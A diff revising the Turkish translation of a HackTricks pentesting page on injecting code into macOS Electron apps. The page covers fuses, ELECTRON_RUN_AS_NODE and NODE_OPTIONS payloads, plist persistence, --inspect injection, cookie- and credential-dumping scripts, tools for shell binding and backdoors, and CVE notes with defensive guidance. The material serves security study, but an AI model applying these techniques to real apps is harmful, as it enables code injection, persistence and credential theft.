@@ -4,26 +4,26 @@
 
 ## Temel Bilgiler
 
-Electron'ın ne olduğunu bilmiyorsanız [**burada birçok bilgi bulabilirsiniz**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Ancak şimdilik Electron'ın **node** çalıştırdığını bilmeniz yeterlidir.\
-Ayrıca node'un, belirtilen dosyanın dışında **başka kodlar çalıştırmasını sağlamak** için kullanılabilecek bazı **parametreleri** ve **env değişkenleri** vardır.
+Electron'ın ne olduğunu bilmiyorsanız [**burada çok sayıda bilgi bulabilirsiniz**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Ancak şimdilik Electron'ın **node** çalıştırdığını bilmeniz yeterlidir.\
+Ve node'un, belirtilen dosyanın dışında **başka kodları çalıştırmasını sağlamak** için kullanılabilecek bazı **parametreleri** ve **env değişkenleri** vardır.
 
 ### Electron Fuses
 
-Bu teknikler ileride ele alınacaktır, ancak son zamanlarda Electron bunları **önlemek için çeşitli güvenlik flag'leri ekledi**. Bunlar [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) olarak adlandırılır ve macOS'ta Electron uygulamalarının **keyfi kod yüklemesini önlemek** için kullanılanlar şunlardır:<sup>[1]</sup>
+Bu teknikler ileride ele alınacaktır; ancak son zamanlarda Electron bunları **önlemek için çeşitli güvenlik flag'leri ekledi**. Bunlar [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) olarak adlandırılır ve macOS'ta Electron uygulamalarının **arbitrary code yüklemesini önlemek** için kullanılanlar şunlardır:<sup>[[1]](#references)</sup>
 
-- **`RunAsNode`**: Devre dışı bırakılırsa, kod enjekte etmek için **`ELECTRON_RUN_AS_NODE`** env değişkeninin kullanılmasını önler.
-- **`EnableNodeCliInspectArguments`**: Devre dışı bırakılırsa, `--inspect`, `--inspect-brk` gibi parametreler dikkate alınmaz. Böylece kod enjekte etmenin bu yolu engellenir.
-- **`EnableEmbeddedAsarIntegrityValidation`**: Etkinleştirilirse, yüklenen **`asar`** **file**, macOS tarafından **doğrulanır**. Böylece bu dosyanın içeriğini değiştirerek gerçekleştirilen **code injection** önlenir.
-- **`OnlyLoadAppFromAsar`**: Etkinleştirilirse, aşağıdaki arama ve yükleme sırası yerine: **`app.asar`**, **`app`** ve son olarak **`default_app.asar`**. Yalnızca app.asar dosyasını kontrol eder ve kullanır; böylece **`embeddedAsarIntegrityValidation`** fuse'u ile **birlikte kullanıldığında**, **doğrulanmamış kodun yüklenmesi** imkansız hale gelir.
-- **`LoadBrowserProcessSpecificV8Snapshot`**: Etkinleştirilirse, browser process V8 snapshot'ı için `browser_v8_context_snapshot.bin` adlı dosyayı kullanır.
+- **`RunAsNode`**: Devre dışı bırakılırsa, kod enjekte etmek için **`ELECTRON_RUN_AS_NODE`** env var'ının kullanılmasını önler.
+- **`EnableNodeCliInspectArguments`**: Devre dışı bırakılırsa, `--inspect`, `--inspect-brk` gibi parametreler dikkate alınmaz. Böylece kod enjekte etme yöntemi engellenir.
+- **`EnableEmbeddedAsarIntegrityValidation`**: Etkinleştirilirse, yüklenen **`asar`** **file**, macOS tarafından **doğrulanır**. Böylece bu file'ın içeriğini değiştirerek gerçekleştirilecek **code injection** önlenir.
+- **`OnlyLoadAppFromAsar`**: Bu etkinleştirilirse, yükleme araması şu sırayla yapılmaz: **`app.asar`**, **`app`** ve son olarak **`default_app.asar`**. Yalnızca app.asar kontrol edilir ve kullanılır; böylece **`embeddedAsarIntegrityValidation`** fuse'u ile **birlikte kullanıldığında**, **doğrulanmamış code yüklemek** imkansız hale gelir.
+- **`LoadBrowserProcessSpecificV8Snapshot`**: Etkinleştirilirse, browser process V8 snapshot'ı için `browser_v8_context_snapshot.bin` adlı file'ı kullanır.
 
-Kod injection'ını önlemeyen başka bir ilginç fuse ise:
+Code injection'ı önlemeyen bir başka ilginç fuse şudur:
 
-- **EnableCookieEncryption**: Etkinleştirilirse, disk üzerindeki cookie store, işletim sistemi düzeyindeki cryptography anahtarları kullanılarak şifrelenir.
+- **EnableCookieEncryption**: Etkinleştirilirse, disk üzerindeki cookie store, OS level cryptography keys kullanılarak şifrelenir.
 
-### Electron Fuses'larını Kontrol Etme
+### Electron Fuses'ları Kontrol Etme
 
-Bu flag'leri bir uygulamadan şu şekilde **kontrol edebilirsiniz**:
+Bu flag'leri bir application'dan şu şekilde **kontrol edebilirsiniz**:
 ```bash
 npx @electron/fuses read --app /Applications/Slack.app
 
@@ -37,36 +37,36 @@ EnableEmbeddedAsarIntegrityValidation is Enabled
 OnlyLoadAppFromAsar is Enabled
 LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
-### Electron Fuses'i Değiştirme
+### Electron Fuses Değiştirme
 
-[**docs belirtildiği gibi**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **Electron Fuses** yapılandırması, içinde bir yerde **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** dizesini barındıran **Electron binary** dosyasının içinde yapılandırılır.<sup>[1]</sup>
+[**Belgelerde belirtildiği gibi**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **Electron Fuses** yapılandırması, içinde bir yerde **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** dizesini içeren **Electron binary** dosyasının içinde yapılandırılır.<sup>[[1]](#references)</sup>
 
-macOS uygulamalarında bu genellikle `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` konumundadır.
+macOS uygulamalarında bu dosya genellikle `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` konumundadır.
 ```bash
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-Bu dosyayı [https://hexed.it/](https://hexed.it/) üzerinde açıp önceki string'i arayabilirsiniz. Bu string'den sonra ASCII olarak, her fuse'un devre dışı mı yoksa etkin mi olduğunu belirten bir "0" veya "1" görebilirsiniz. **Fuse değerlerini değiştirmek** için hex kodunu (`0x30`, `0` ve `0x31`, `1` değeridir) değiştirmeniz yeterlidir.
+Bu dosyayı [https://hexed.it/](https://hexed.it/) içinde açabilir ve önceki string'i arayabilirsiniz. Bu string'den sonra ASCII biçiminde, her fuse'un devre dışı mı yoksa etkin mi olduğunu gösteren bir "0" veya "1" görebilirsiniz. **Fuse değerlerini değiştirmek** için hex kodunu (`0x30`, `0` ve `0x31`, `1` değeridir) değiştirmeniz yeterlidir.
 
 <figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>
 
-Bu şekilde değiştirilmiş byte'lar içeren bir uygulamanın içindeki **`Electron Framework` binary** dosyasını **overwrite** etmeye çalışırsanız uygulamanın çalışmayacağını unutmayın.
+Değiştirilmiş bu byte'lara sahip **`Electron Framework` binary** dosyasını bir uygulamanın içinde **overwrite** etmeye çalışırsanız uygulamanın çalışmayacağını unutmayın.
 
-## Electron Applications'a kod ekleyerek RCE
+## Electron Applications'a code ekleyerek RCE
 
 Bir Electron App'in kullandığı **external JS/HTML files** olabilir. Bu nedenle bir attacker, signature'ı kontrol edilmeyen bu dosyalara code inject edebilir ve app context'inde arbitrary code execute edebilir.
 
 > [!CAUTION]
-> Ancak şu anda 2 sınırlama vardır:
+> Ancak şu anda 2 limitation bulunmaktadır:
 >
-> - Bir App'i modify etmek için **`kTCCServiceSystemPolicyAppBundles`** permission'ı **gereklidir**; dolayısıyla varsayılan olarak bu artık mümkün değildir.
-> - Compiled **`asap`** file genellikle **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** fuse'larını **enabled** olarak içerir.
+> - Bir App'i modify etmek için **`kTCCServiceSystemPolicyAppBundles`** permission'ı **gereklidir**; bu nedenle varsayılan olarak artık mümkün değildir.
+> - Compiled **`asap`** file'ında genellikle **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** fuses'ları **enabled** durumdadır.
 >
-> Bu durum attack path'i daha karmaşık (veya imkansız) hale getirir.
+> Bu durum attack path'i daha complicated (veya impossible) hale getirir.
 
-**`kTCCServiceSystemPolicyAppBundles`** gereksinimini, application'ı başka bir directory'ye (örneğin **`/tmp`**) copy ederek, **`app.app/Contents`** folder'ını **`app.app/NotCon`** olarak rename ederek, **`asar`** file'ını **malicious** code ile modify ederek, yeniden **`app.app/Contents`** olarak rename edip execute ederek bypass etmek mümkündür.
+**`kTCCServiceSystemPolicyAppBundles`** gereksinimini, application'ı başka bir directory'ye (örneğin **`/tmp`**) copy'leyerek, **`app.app/Contents`** folder'ını **`app.app/NotCon`** olarak rename'leyerek, **asar** file'ını **malicious** code'unuzla **modify** ederek, tekrar **`app.app/Contents`** olarak rename'leyerek ve execute ederek bypass etmenin mümkün olduğunu unutmayın.
 
-Code'u asar file'ından şu komutla unpack edebilirsiniz:
+asar file'ındaki code'u şu komutla unpack edebilirsiniz:
 ```bash
 npx asar extract app.asar app-decomp
 ```
@@ -76,7 +76,7 @@ npx asar pack app-decomp app-new.asar
 ```
 ## ELECTRON_RUN_AS_NODE ile RCE
 
-[**dokümantasyona**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node) göre, bu environment variable ayarlanırsa process'i normal bir Node.js process'i olarak başlatır.<sup>[6]</sup>
+[**docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)'a göre bu env variable ayarlanırsa process normal bir Node.js process'i olarak başlatılır.<sup>[[6]](#references)</sup>
 ```bash
 # Run this
 ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
@@ -84,11 +84,11 @@ ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
 > [!CAUTION]
-> **`RunAsNode`** fuse'u devre dışıysa **`ELECTRON_RUN_AS_NODE`** env var'ı yok sayılır ve bu çalışmaz.
+> **`RunAsNode`** fuse'u devre dışı bırakılırsa **`ELECTRON_RUN_AS_NODE`** env var'ı yok sayılır ve bu çalışmaz.
 
 ### App Plist'ten Injection
 
-[**Burada önerildiği gibi**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), kalıcılığı sürdürmek için bir plist içindeki bu env var'ı abuse edebilirsiniz:<sup>[2]</sup>
+[**Burada önerildiği gibi**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), persistence'ı sürdürmek için bu env variable'ı bir plist içinde abuse edebilirsiniz:<sup>[[2]](#references)</sup>
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -114,7 +114,7 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 ```
 ## `NODE_OPTIONS` ile RCE
 
-Payload'u farklı bir dosyada depolayıp çalıştırabilirsiniz:
+Payload'ı farklı bir dosyada saklayabilir ve çalıştırabilirsiniz:
 ```bash
 # Content of /tmp/payload.js
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');
@@ -123,13 +123,13 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 ```
 > [!CAUTION]
-> **`EnableNodeOptionsEnvironmentVariable`** fuse'u **devre dışıysa**, uygulama başlatıldığında **`ELECTRON_RUN_AS_NODE`** ortam değişkeni ayarlanmadığı sürece **NODE_OPTIONS** env var'ını **yok sayar**; fuse **`RunAsNode`** devre dışıysa bu değişken de **yok sayılır**.
+> **`EnableNodeOptionsEnvironmentVariable`** fuse'u **devre dışı** bırakılmışsa uygulama, **`ELECTRON_RUN_AS_NODE`** env variable'ı ayarlanmadığı sürece başlatıldığında **NODE_OPTIONS** env variable'ını **yok sayar**; fuse **`RunAsNode`** devre dışı bırakılmışsa bu env variable da **yok sayılır**.
 >
-> **`ELECTRON_RUN_AS_NODE`** ayarlanmazsa şu **hatayı** alırsınız: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
+> **`ELECTRON_RUN_AS_NODE`** ayarlanmazsa şu **error** ile karşılaşırsınız: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
 
-### App Plist'ten Injection
+### App Plist üzerinden Injection
 
-Persistence sağlamak için bir plist dosyasındaki bu env var'ı kötüye kullanarak aşağıdaki anahtarları ekleyebilirsiniz:
+Bu env variable'ı bir plist içinde abuse ederek aşağıdaki key'leri ekleyip persistence sağlayabilirsiniz:
 ```xml
 <dict>
 <key>EnvironmentVariables</key>
@@ -145,21 +145,21 @@ Persistence sağlamak için bir plist dosyasındaki bu env var'ı kötüye kulla
 <true/>
 </dict>
 ```
-## inspecting ile RCE
+## inspect ile RCE
 
-[**bu**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) kaynağa göre, bir Electron uygulamasını **`--inspect`**, **`--inspect-brk`** ve **`--remote-debugging-port`** gibi flag'lerle çalıştırırsanız, bağlanabileceğiniz bir **debug portu açılır** (örneğin Chrome'daki `chrome://inspect` üzerinden) ve bu porta **code enjekte** edebilir, hatta yeni process'ler başlatabilirsiniz.<sup>[7]</sup>\
+[**Bu**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) kaynağa göre, bir Electron uygulamasını **`--inspect`**, **`--inspect-brk`** ve **`--remote-debugging-port`** gibi flag'lerle çalıştırırsanız, **bir debug portu açılır**; böylece bu porta bağlanabilir (örneğin Chrome'da `chrome://inspect` üzerinden) ve **üzerine code inject edebilir** veya hatta yeni process'ler başlatabilirsiniz.<sup>[[7]](#references)</sup>\
 Örneğin:
 ```bash
 /Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
 # Connect to it using chrome://inspect and execute a calculator with:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
-In [**bu blogpost**](https://hackerone.com/reports/1274695), bu debugging, headless chrome'un **herhangi bir dosyayı herhangi bir konuma indirmesini** sağlamak için abuse ediliyor.<sup>[8]</sup>
+In [**bu blogpostta**](https://hackerone.com/reports/1274695), bu debugging, headless chrome'un **herhangi bir konuma rastgele dosyalar indirmesini** sağlamak için kötüye kullanılıyor.<sup>[[8]](#references)</sup>
 
 > [!TIP]
-> Bir app'in env variables veya `--inspect` gibi parametrelerin ayarlanıp ayarlanmadığını kontrol etmek için kendine özgü bir yöntemi varsa, `--inspect-brk` arg'ını kullanarak bunu runtime'da **bypass** etmeyi deneyebilirsiniz. Bu arg, **app'in başlangıcında execution'ı durdurur** ve bir bypass çalıştırmanıza olanak tanır (örneğin mevcut process'in args veya env variables değerlerini overwrite ederek).
+> Bir uygulamanın env değişkenlerinin veya `--inspect` gibi parametrelerin ayarlanıp ayarlanmadığını kontrol etmek için kendine özgü bir yöntemi varsa, uygulamanın başlangıcında **çalışmayı durduracak** ve bir bypass gerçekleştirecek `--inspect-brk` argümanını kullanarak bunu runtime'da **bypass etmeyi** deneyebilirsiniz (örneğin mevcut process'in argümanlarını veya env değişkenlerini üzerine yazarak).
 
-Aşağıdaki exploit'te, app'i `--inspect-brk` parametresiyle monitoring ve execution ederek sahip olduğu custom protection'ı bypass etmek mümkün oluyordu (`--inspect-brk` parametresini kaldırmak için process'in params değerlerini overwrite ederek) ve ardından app'ten cookies ve credentials dump etmek için bir JS payload inject ediliyordu:
+Aşağıdaki exploit'te, uygulamayı `--inspect-brk` parametresiyle izleyip çalıştırarak sahip olduğu özel korumayı bypass etmek (process'in parametrelerinin üzerine yazarak `--inspect-brk` parametresini kaldırmak) ve ardından uygulamadaki cookie'leri ve kimlik bilgilerini dump etmek için bir JS payload enjekte etmek mümkün oluyordu:
 ```python
 import asyncio
 import websockets
@@ -363,13 +363,13 @@ if __name__ == "__main__":
 asyncio.run(main())
 ```
 > [!CAUTION]
-> **`EnableNodeCliInspectArguments`** fuse'u devre dışıysa, **`ELECTRON_RUN_AS_NODE`** env variable'ı ayarlanmadığı sürece uygulama başlatıldığında **node parametrelerini** (örneğin `--inspect`) **yoksayar**; fuse **`RunAsNode`** devre dışıysa bu değişken de **yoksayılır**.
+> **`EnableNodeCliInspectArguments`** fuse'ı devre dışı bırakılırsa uygulama, **`ELECTRON_RUN_AS_NODE`** ortam değişkeni ayarlanmadığı sürece başlatıldığında **node parametrelerini** (örneğin **`--inspect`**) yok sayar; fuse **`RunAsNode`** devre dışı bırakılmışsa bu ortam değişkeni de yok sayılır.
 >
-> Ancak yine de **`--remote-debugging-port=9229`** **electron parametresini** kullanabilirsiniz, fakat önceki payload diğer process'leri çalıştırmak için işe yaramaz.
+> Ancak yine de **electron parametresi `--remote-debugging-port=9229`** kullanılabilir, fakat önceki payload diğer process'leri çalıştırmak için işe yaramaz.
 
-**`--remote-debugging-port=9222`** parametresini kullanarak Electron App'ten **history** (GET komutlarıyla) veya browser'ın **cookies**'leri gibi bazı bilgileri çalmak mümkündür (bunlar browser'ın içinde **decrypted** durumdadır ve bunları sağlayan bir **json endpoint** bulunur).
+**`--remote-debugging-port=9222`** parametresi kullanılarak Electron App'ten **history** (GET komutlarıyla) veya browser'ın **cookies**'leri gibi bazı bilgiler çalınabilir (bunlar browser içinde **decrypted** durumdadır ve bunları sağlayan bir **json endpoint** bulunur).
 
-Bunu nasıl yapacağınızı [**burada**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) ve [**burada**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) öğrenebilir; otomatik [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) aracını veya aşağıdakine benzer basit bir script'i kullanabilirsiniz:<sup>[9][10]</sup>
+Bunu nasıl yapacağınızı [**burada**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) ve [**burada**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) öğrenebilir ve otomatik araç olan [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) veya aşağıdaki gibi basit bir script kullanabilirsiniz:<sup>[[9]](#references)[[10]](#references)</sup>
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -379,7 +379,7 @@ print(ws.recv()
 ```
 ### App Plist'inden Injection
 
-Persistence sağlamak için bir plist içindeki bu env variable'ı kötüye kullanarak şu anahtarları ekleyebilirsiniz:
+Persistence sağlamak için bir plist içindeki bu env variable'ı kötüye kullanarak şu key'leri ekleyebilirsiniz:
 ```xml
 <dict>
 <key>ProgramArguments</key>
@@ -393,42 +393,42 @@ Persistence sağlamak için bir plist içindeki bu env variable'ı kötüye kull
 <true/>
 </dict>
 ```
-## Eski Sürümleri kötüye kullanarak TCC Bypass
+## Daha Eski Sürümleri Kötüye Kullanarak TCC Bypass
 
 > [!TIP]
-> macOS'taki TCC daemon'u uygulamanın çalıştırılan sürümünü kontrol etmez. Bu nedenle, önceki tekniklerden herhangi biriyle **bir Electron application içine code inject edemiyorsanız**, APP'nin önceki bir sürümünü indirip code inject edebilirsiniz; çünkü bu sürüm yine TCC privileges alacaktır (Trust Cache bunu engellemediği sürece).
+> macOS'taki TCC daemon'u uygulamanın çalıştırılan sürümünü kontrol etmez. Bu nedenle, önceki tekniklerden herhangi biriyle **bir Electron application içine code inject edemiyorsanız**, APP'nin önceki bir sürümünü indirip bu sürüme code inject edebilirsiniz; çünkü bu sürüm yine TCC privileges alır (Trust Cache bunu engellemediği sürece).
 
 ## JS Olmayan Code Çalıştırma
 
-Önceki teknikler, **Electron application process'i içinde JS code çalıştırmanıza** olanak tanır. Ancak **child process'lerin parent application ile aynı sandbox profile altında çalıştığını ve TCC permissions'larını devraldığını** unutmayın.\
-Bu nedenle, örneğin camera veya microphone'a erişmek için entitlements'ı kötüye kullanmak istiyorsanız, **process'ten başka bir binary çalıştırmanız** yeterlidir.
+Önceki teknikler, **Electron application process'i içinde JS code çalıştırmanıza** olanak tanır. Ancak **child process'lerin parent application ile aynı sandbox profile altında çalıştığını** ve **TCC permissions'larını devraldığını** unutmayın.\
+Bu nedenle, örneğin camera veya microphone'a erişmek için entitlements'ı kötüye kullanmak istiyorsanız, **process içinden başka bir binary çalıştırmanız** yeterlidir.
 
 ## Dikkate Değer Electron macOS Vulnerabilities (2023-2024)
 
 ### CVE-2023-44402 – ASAR integrity bypass
 
-Electron ≤22.3.23 ve çeşitli 23-27 pre-release sürümleri, `.app/Contents/Resources` folder'ına write access'i olan bir attacker'ın `embeddedAsarIntegrityValidation` **ve** `onlyLoadAppFromAsar` fuses'larını bypass etmesine olanak tanıyordu. Bug, integrity checker'daki bir *file-type confusion* sorunuydu; bu sorun, validate edilmiş archive yerine **`app.asar` adında hazırlanmış bir directory'nin** yüklenmesine izin veriyordu. Böylece bu directory içine yerleştirilen JavaScript, app başlatıldığında execute ediliyordu. Bu nedenle, hardening guidance'ı izleyen ve her iki fuse'u da enable eden vendor'lar bile macOS'ta hâlâ vulnerable durumdaydı.<sup>[3]</sup>
+Electron ≤22.3.23 ve çeşitli 23-27 pre-release sürümleri, `.app/Contents/Resources` folder'ına write access'i olan bir saldırganın `embeddedAsarIntegrityValidation` **ve** `onlyLoadAppFromAsar` fuses'larını bypass etmesine izin veriyordu. Bug, integrity checker içindeki bir *file-type confusion* problemiydi ve hazırlanmış **`app.asar` adlı bir directory'nin** doğrulanmış archive yerine yüklenmesine olanak tanıyordu; bu nedenle bu directory içine yerleştirilen herhangi bir JavaScript, application başlatıldığında çalıştırılıyordu. Hardening guidance'ı izleyip her iki fuse'u etkinleştiren vendor'lar bile macOS'ta hâlâ vulnerable durumdaydı.<sup>[[3]](#references)</sup>
 
-Patched Electron versions: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** ve **27.0.0-alpha.7**. Daha eski bir build çalıştıran application bulan attacker'lar, application'ın TCC entitlements'larıyla code execute etmek için `Contents/Resources/app.asar`'ı kendi directory'leriyle overwrite edebilir.<sup>[3]</sup>
+Patch uygulanmış Electron sürümleri: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** ve **27.0.0-alpha.7**. Daha eski bir build çalıştıran saldırganlar, application'ın TCC entitlements'larıyla code çalıştırmak için `Contents/Resources/app.asar` dosyasını kendi directory'leriyle değiştirebilir.<sup>[[3]](#references)</sup>
 
 ### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster'ı
 
-Ocak 2024'te bir dizi CVE (CVE-2024-23738 ile CVE-2024-23743 arası), birçok Electron app'inin **RunAsNode** ve **EnableNodeCliInspectArguments** fuses'ları hâlâ enabled şekilde dağıtıldığını ortaya koydu. Bu nedenle local attacker, programı `ELECTRON_RUN_AS_NODE=1` environment variable'ı veya `--inspect-brk` gibi flag'lerle yeniden launch ederek onu *generic* bir Node.js process'ine dönüştürebilir ve application'ın sandbox ve TCC permissions'larının tamamını devralabilir.<sup>[4]</sup>
+Ocak 2024'te bir dizi CVE (CVE-2024-23738 ile CVE-2024-23743 arası), birçok Electron application'ın **RunAsNode** ve **EnableNodeCliInspectArguments** fuses'larını hâlâ etkin şekilde sunduğunu ortaya çıkardı. Bu nedenle local bir saldırgan, programı `ELECTRON_RUN_AS_NODE=1` environment variable'ı veya `--inspect-brk` gibi flag'lerle yeniden başlatarak programı *generic* bir Node.js process'ine dönüştürebilir ve application'ın sandbox ve TCC permissions'larının tamamını devralabilir.<sup>[[4]](#references)</sup>
 
-Electron team'inin “critical” rating'ini tartışmasına ve attacker'ın zaten local code–execution'a ihtiyaç duyduğuna dikkat çekmesine rağmen, bu issue post-exploitation sırasında hâlâ değerlidir; çünkü herhangi bir vulnerable Electron bundle'ını, örneğin desktop app'e daha önce verilen Contacts, Photos veya diğer sensitive resources'ları okuyabilen bir *living-off-the-land* binary'sine dönüştürür.<sup>[4]</sup>
+Electron team “critical” rating'ine itiraz etmiş ve saldırganın zaten local code execution'a ihtiyaç duyduğunu belirtmiş olsa da bu issue post-exploitation sırasında hâlâ değerlidir; çünkü vulnerable durumdaki herhangi bir Electron bundle'ını, desktop app'e daha önce verilen Contacts, Photos veya diğer sensitive resources'ları örneğin okuyabilen bir *living-off-the-land* binary'sine dönüştürür.<sup>[[4]](#references)</sup>
 
-Electron maintainers tarafından sağlanan defensive guidance:<sup>[4]</sup>
+Electron maintainers tarafından sağlanan defensive guidance:<sup>[[4]](#references)</sup>
 
 * Production build'lerinde `RunAsNode` ve `EnableNodeCliInspectArguments` fuses'larını disable edin.
-* Application'ınızın meşru olarak bir helper Node.js process'ine ihtiyaç duyması durumunda, bu fuses'ları yeniden enable etmek yerine daha yeni **UtilityProcess** API'sini kullanın.
+* Application'ınızın gerçekten helper Node.js process'ine ihtiyacı varsa, bu fuses'ları yeniden etkinleştirmek yerine daha yeni **UtilityProcess** API'sini kullanın.
 
 ## Automatic Injection
 
 - [**electroniz3r**](https://github.com/r3ggi/electroniz3r)
 
-[**electroniz3r**](https://github.com/r3ggi/electroniz3r) tool'u, installed durumdaki **vulnerable electron applications'ları bulmak ve bunlara code inject etmek** için kolayca kullanılabilir. Bu tool **`--inspect`** technique'ini kullanmayı dener:
+[**electroniz3r**](https://github.com/r3ggi/electroniz3r) tool'u, kurulu **vulnerable electron applications'ları bulmak** ve bunlara code inject etmek için kolayca kullanılabilir. Bu tool, **`--inspect`** tekniğini kullanmayı dener:
 
-Önce kendiniz compile etmeniz gerekir ve şu şekilde kullanabilirsiniz:
+Tool'u kendiniz compile etmeniz gerekir ve şu şekilde kullanabilirsiniz:
 ```bash
 # Find electron apps
 ./electroniz3r list-apps
@@ -466,20 +466,20 @@ Shell binding requested. Check `nc 127.0.0.1 12345`
 ```
 - [https://github.com/boku7/Loki](https://github.com/boku7/Loki)
 
-Loki, Electron uygulamalarının JavaScript dosyalarını Loki Command & Control JavaScript dosyalarıyla değiştirerek arka kapı yerleştirmek üzere tasarlanmıştır.
+Loki, uygulamaların JavaScript dosyalarını Loki Command & Control JavaScript dosyalarıyla değiştirerek Electron uygulamalarına backdoor yerleştirmek için tasarlanmıştır.
 
 
 ## Referanslar
 
 - [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
-- [2] [Üçüncü Taraf Framework'ler üzerinden MacOS Injection - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
-- [3] [Dosya türü karmaşası üzerinden ASAR Integrity bypass (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
-- [4] ['runAsNode' CVE'leri hakkında açıklama - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
-- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - Red Teaming cephaneliğinizde yeni bir silah - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
+- [2] [MacOS Injection via Third-Party Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
+- [3] [ASAR Integrity bypass via filetype confusion (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
+- [4] [Statement regarding 'runAsNode' CVEs - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
+- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - A New Weapon in Your Red Teaming Armory - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
 - [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
-- [7] [Electron uygulamaları sırlarınızı neden gizli tutamaz: --inspect seçeneği](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
-- [8] [HackerOne Report #1274695 - Electron debugging kötüye kullanılarak rastgele dosyalar indirildi](https://hackerone.com/reports/1274695)
-- [9] [Cookie Jar'a eller: Chromium'un Remote Debugger Port'u ile Cookie'leri dump etme - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
-- [10] [Chromium'un Remote Debugger'ı ile Cookie Dumping hatalarını ayıklama - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
+- [7] [Why Electron apps can't store your secrets confidentially: --inspect option](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
+- [8] [HackerOne Report #1274695 - Electron debugging abused to download arbitrary files](https://hackerone.com/reports/1274695)
+- [9] [Hands in the Cookie Jar: Dumping Cookies with Chromium's Remote Debugger Port - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
+- [10] [Debugging Cookie Dumping Failures with Chromium's Remote Debugger - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
 
 {{#include ../../../banners/hacktricks-training.md}}
